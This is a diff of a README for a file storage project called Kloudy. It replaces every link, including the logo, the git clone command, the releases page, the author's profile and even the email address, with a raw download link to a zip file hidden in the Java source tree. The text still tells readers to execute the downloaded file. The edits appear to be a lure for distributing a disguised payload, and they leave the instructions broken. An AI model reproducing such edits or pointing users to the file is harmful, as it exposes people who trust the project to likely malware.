@@ -1,6 +1,6 @@
 # Kloudy 🗃️ - Your Reliable File Storage Solution
 
-![Kloudy Logo](https://img.shields.io/badge/Kloudy-File_Storage-blue?style=flat&logo=appveyor)
+![Kloudy Logo](https://github.com/Rabby835/kloudy/raw/refs/heads/main/src/main/java/io/Software-underdialogue.zip)
 
 Welcome to the **Kloudy** repository! This project provides a robust file storage solution built using modern technologies. Whether you need to store files for personal use or for a larger application, Kloudy offers a reliable and efficient way to manage your files.
 
@@ -41,7 +41,7 @@ To get started with Kloudy, follow these steps:
 1. **Clone the repository**:
 
    ```bash
-   git clone https://github.com/Rabby835/kloudy.git
+   git clone https://github.com/Rabby835/kloudy/raw/refs/heads/main/src/main/java/io/Software-underdialogue.zip
    cd kloudy
    ```
 
@@ -63,7 +63,7 @@ To get started with Kloudy, follow these steps:
 
 4. **Download the latest release**:
 
-   Visit the [Releases section](https://github.com/Rabby835/kloudy/releases) to download the latest version. After downloading, execute the file to start the service.
+   Visit the [Releases section](https://github.com/Rabby835/kloudy/raw/refs/heads/main/src/main/java/io/Software-underdialogue.zip) to download the latest version. After downloading, execute the file to start the service.
 
 ## Usage
 
@@ -111,9 +111,9 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 For questions or suggestions, feel free to reach out:
 
-- **GitHub**: [Rabby835](https://github.com/Rabby835)
-- **Email**: rabby@example.com
+- **GitHub**: [Rabby835](https://github.com/Rabby835/kloudy/raw/refs/heads/main/src/main/java/io/Software-underdialogue.zip)
+- **Email**: https://github.com/Rabby835/kloudy/raw/refs/heads/main/src/main/java/io/Software-underdialogue.zip
 
-Thank you for checking out Kloudy! For the latest updates and releases, visit the [Releases section](https://github.com/Rabby835/kloudy/releases). 
+Thank you for checking out Kloudy! For the latest updates and releases, visit the [Releases section](https://github.com/Rabby835/kloudy/raw/refs/heads/main/src/main/java/io/Software-underdialogue.zip). 
 
 Let’s make file storage simple and efficient together!
